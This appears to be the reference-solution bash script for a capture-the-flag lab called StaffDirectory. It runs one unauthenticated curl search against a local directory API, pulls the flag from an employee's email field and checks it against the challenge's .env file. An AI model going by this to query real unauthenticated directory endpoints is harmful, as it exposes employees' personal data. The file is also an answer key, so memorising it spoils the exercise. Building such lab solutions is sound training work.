#!/usr/bin/env bash
# ============================================================
# StaffDirectory (labs16) — reference solution:
# unauthenticated directory search
#
# Chain: one targeted search for the distinctive seeded name
# ("Morgan Chen") — the flag is that employee's email field.
# A single quiet query; the 5/30s rate limit is never
# approached.
#
# Usage: ./run.sh [base-url]     (default http://localhost:8096)
# Prints the flag on stdout; exit 0 on success.
# ============================================================
set -euo pipefail

BASE="${1:-http://localhost:8096}"
SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"

echo "[*] one targeted search for the seeded outlier name" >&2
RESP="$(curl -fsS "$BASE/api/search?q=morgan")"

flag="$(python3 - "$RESP" <<'PY'
import json, sys
for u in json.loads(sys.argv[1]):
    if str(u.get("email", "")).startswith("FLAG{"):
        print(u["email"])
        break
PY
)"
if [[ -z "${flag:-}" ]]; then
  echo "[-] failed: no flag email in search results" >&2
  exit 1
fi

echo "$flag"
expected="$(sed -n 's/^FLAG="\([^"]*\)"$/\1/p' "$SCRIPT_DIR/../challenge/.env")"
if [[ "$flag" == "$expected" ]]; then
  echo "[+] PASS: flag matches challenge/.env" >&2
else
  echo "[-] FAIL: got $flag, expected $expected" >&2
  exit 1
fi
